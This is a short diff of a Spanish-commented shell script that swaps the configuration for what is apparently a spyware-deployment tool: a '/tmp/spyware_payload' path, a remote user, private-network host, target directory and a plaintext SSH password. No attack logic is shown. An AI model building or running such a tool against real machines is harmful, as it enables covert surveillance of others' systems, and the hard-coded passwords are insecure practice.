@@ -2,10 +2,10 @@
 
 # Variables globales
 PAYLOAD_FILE="/tmp/spyware_payload"
-REMOTE_USER="steve-quezada"
-REMOTE_HOST="192.168.91.128"
-REMOTE_PATH="/home/steve-quezada/Music"
-SSH_PASS="Steve-Debian"
+REMOTE_USER="cripto"
+REMOTE_HOST="192.168.56.102"
+REMOTE_PATH="/home/cripto/Downloads"
+SSH_PASS="qwert12345"
 
 # Mejora de formato para separadores
 print_separator() {
